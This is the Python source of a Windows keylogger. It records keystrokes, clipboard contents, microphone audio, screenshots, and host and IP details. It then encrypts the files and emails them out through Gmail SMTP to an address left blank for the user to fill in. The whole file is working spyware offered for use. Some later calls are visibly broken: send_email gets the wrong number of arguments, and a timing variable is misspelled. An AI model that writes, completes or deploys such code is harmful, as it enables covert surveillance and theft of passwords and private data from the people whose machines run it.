from email.mime.multipart import MIMEMultipart  #import MIME Extension in email used for large files
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket   # provides a way to create, connect,send and receive data
import platform  # Used to retrieve information about os

import win32clipboard   # Area to store data

from pynput.keyboard import Key, Listener  # Control and monitor input devices

import time  # To get current time 
import os    # Information about Hardware component 

from scipy.io.wavfile import write   # audio in linear pulse code
import sounddevice as sd     # To play and run the audio file

from cryptography.fernet import Fernet   # For Encryption and Decryption of the file

import getpass         # Secure way to handle the password
from requests import get

from multiprocessing import Process, freeze_support   # For concurrently using applications 
from PIL import ImageGrab


keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

# Encrypted Files
keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"
audio_information_e = "e_audio.wav"
screenshot_information_e = "e_screenshot.png"

# Generate key for encryption
key = "DdV1rNJ0ujTkZK00Xfd60Sq0Qa5T3-z8EEErhE425kI="

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3


email_address = " "  # use any disposable email 
password = " "  # password for the given email

username = getpass.getuser()

toaddr = " "  # use any disposable email 


file_path = "D:"
extend = "\\"
file_merge = file_path + extend 

subject = "Invention"
body = "Keylogger buddy work done"


filename1 = keys_information
filename2 = system_information
filename3 = clipboard_information
filename4 = audio_information
filename5 = screenshot_information


stoppingTime = 5

 
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("couldn't get Public IP Address most likely max query")
            
        f.write("processor: " + (platform.processor()) + '\n')
        f.write("system: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write(" Private IP Address: " + IPAddr + "\n")
        
computer_information()

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            
            f.write("Clipboard Data: \n" + pasted_data)
            
        except:
            f.write("Clipboard could be not be copied")
        
copy_clipboard()

def microphone():
    fs = 44100
    seconds = microphone_time
    
    myrecording =  sd.rec(int(seconds * fs), samplerate=fs, channels = 2)
    
    sd.wait()
    
    write(file_path + extend + audio_information,fs, myrecording)
    
microphone()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + screenshot_information)

screenshot()
   


import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# email information

def send_email(filename1, filename2, filename3, filename4, filename5, attachment1, attachment2, attachment3, attachment4, attachment5, subject, body, toaddr, email_address, password):
    # Set up the MIME message
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = toaddr
    msg['Subject'] = subject

    # Attach the body text to the email
    msg.attach(MIMEText(body, 'plain'))
    
    # Function to attach files
    def attach_file(filename, attachment_path):
        with open(attachment_path, 'rb') as attachment:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(attachment.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename={filename}")
            msg.attach(p)

    # Attach each file separately
    attach_file(filename1, attachment1)
    attach_file(filename2, attachment2)
    attach_file(filename3, attachment3)
    attach_file(filename4, attachment4)
    attach_file(filename5, attachment5)
    
    try:
        # Connect to the server and send email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  # Enable TLS
        server.login(email_address, password)
        text = msg.as_string()
        server.sendmail(email_address, toaddr, text)
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")


send_email(filename1, filename2, filename3, filename4, filename5, keys_information, system_information, audio_information, clipboard_information, screenshot_information, subject, body, toaddr, email_address, password)

 
# Time logger

number_of_iterations = 0
currentTime = time.time()
stoppingTim = time.time() + time_iteration


while number_of_iterations < number_of_iterations_end:
    
    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()
        
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    if currentTime > stoppingTime:
        
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")
            
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()
        
        number_of_iterations += 1
        
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration
        


# Encryption and Decryptioon Purpose
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information, file_merge + audio_information, file_merge + screenshot_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e, file_merge + audio_information_e, file_merge + screenshot_information_e]


count = 0


for encrypting_file in files_to_encrypt:
    
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()
        
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    
    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)
        
        
    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1
    
time.sleep(120)



